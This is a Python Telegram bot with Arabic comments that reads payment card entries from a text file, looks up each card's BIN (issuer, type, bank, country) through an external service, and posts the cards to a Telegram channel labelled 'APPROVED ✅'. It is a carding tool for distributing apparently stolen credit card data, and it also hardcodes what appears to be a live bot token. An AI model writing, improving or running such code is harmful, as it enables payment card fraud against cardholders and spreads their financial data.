import telebot
import requests
import time
from random import choice
import json
import threading

# توكن البوت
BOT_TOKEN = "7983611945:AAH8BA42GyvwQ__9ePR8v6T-KXlKRm6Dofg"
CHANNEL_ID = -1002380061998
SENT_CARDS_FILE = "sent_cards.json"

bot = telebot.TeleBot(BOT_TOKEN)

# روابط الصور
images = [
    "https://t.me/reeetere/37", "https://t.me/reeetere/38", "https://t.me/reeetere/39",
    "https://t.me/reeetere/40", "https://t.me/reeetere/41", "https://t.me/reeetere/42",
    "https://t.me/reeetere/43", "https://t.me/reeetere/44", "https://t.me/reeetere/45",
    "https://t.me/reeetere/46", "https://t.me/reeetere/47", "https://t.me/reeetere/48",
    "https://t.me/reeetere/49", "https://t.me/reeetere/50", "https://t.me/reeetere/51",
    "https://t.me/reeetere/52", "https://t.me/reeetere/53", "https://t.me/reeetere/54",
    "https://t.me/reeetere/55", "https://t.me/reeetere/56"
]

# تحميل وحفظ الفيز المرسلة
def load_sent_cards():
    try:
        with open(SENT_CARDS_FILE, "r") as file:
            data = file.read().strip()
            return set(json.loads(data)) if data else set()
    except (FileNotFoundError, json.JSONDecodeError):
        return set()

def save_sent_cards(cards):
    with open(SENT_CARDS_FILE, "w") as file:
        json.dump(list(cards), file)

# تحميل الفيز المرسلة عند بدء التشغيل
sent_cards = load_sent_cards()

# جلب معلومات BIN
def info(card):
    while True:
        response = requests.get(f'https://bins.antipublic.cc/bins/{card[:6]}')
        if 'not found' in response.text:
            return ("------", "------", "------", "------", "------", "------")
        elif 'Cloudflare' in response.text:
            break
        elif response.status_code == 200:
            break

    if response.status_code == 200:
        data = ['brand', 'type', 'level', 'bank', 'country_name', 'country_flag']
        result = []
        for field in data:
            try:
                result.append(response.json()[field])
            except:
                result.append("------")  
        return tuple(result)
    else:
        return ("------", "------", "------", "------", "------", "------")

# إرسال فيزا مع المعلومات
def send_card(card):
    global sent_cards
    if card in sent_cards:
        return
    
    brand, card_type, level, bank, country, flag = info(card)
    msg = f"""
ᴄᴄ⇾{card}
• sᴛᴀᴛᴜs⇾APPROVED ✅
━━━━━━• ɪɴꜰᴏ •━━━━━━
• ʙɪɴ⇾{card[:6]} | {brand} | {card_type}
• ᴄᴏᴜɴᴛʀʏ⇾{country}{flag}
• ʙᴀɴᴋ⇾{bank}
"""

    image_url = choice(images)
    markup = telebot.types.InlineKeyboardMarkup()
    button1 = telebot.types.InlineKeyboardButton("Admin", url="https://t.me/wwpww6")
    button2 = telebot.types.InlineKeyboardButton("Hello World", url="https://t.me/c/2380061998/23")
    markup.add(button1, button2)

    bot.send_photo(CHANNEL_ID, image_url, caption=msg, reply_markup=markup)
    sent_cards.add(card)
    save_sent_cards(sent_cards)
    time.sleep(5)

# استيراد الفيز من ملف نصي
def process_file(file_name):
    try:
        with open(file_name, "r") as file:
            lines = file.readlines()
            for line in lines:
                if "|" in line:  # يفترض أن الفيز تكون على هذا الشكل
                    card = line.strip()
                    send_card(card)
            print("تمت معالجة الملف وإرسال الفيز.")
    except FileNotFoundError:
        print(f"الملف {file_name} غير موجود.")
    except Exception as e:
        print(f"حدث خطأ أثناء معالجة الملف: {e}")

# أمر إيقاف البوت
stop_bot = False

@bot.message_handler(commands=['stop'])
def stop_command(message):
    global stop_bot
    if message.chat.type == "private" and message.chat.id == CHANNEL_ID:  # تأكد أن الأمر فقط من المدير
        bot.reply_to(message, "✅ تم إيقاف البوت.")
        stop_bot = True
    else:
        bot.reply_to(message, "❌ لا تملك صلاحية إيقاف البوت.")

# إعادة تشغيل البوت
def restart_bot():
    global stop_bot
    while not stop_bot:
        time.sleep(1)
    exit()

# أوامر البوت
@bot.message_handler(commands=['start'])
def start_command(message):
    bot.reply_to(message, "مرحبًا! استخدم الأوامر التالية:\n/import_file [اسم الملف]\n/stop لإيقاف البوت.")

@bot.message_handler(commands=['import_file'])
def import_file(message):
    try:
        file_name = message.text.split()[1]
        bot.reply_to(message, f"✅ جارٍ معالجة الملف: {file_name}")
        process_file(file_name)
    except IndexError:
        bot.reply_to(message, "❌ يجب إدخال اسم الملف بعد الأمر.\nمثال: `/import_file cards.txt`")
    except Exception as e:
        bot.reply_to(message, f"❌ حدث خطأ: {e}")

# تشغيل البوت في سلسلة منفصلة
threading.Thread(target=restart_bot).start()

# بدء البوت
bot.polling()
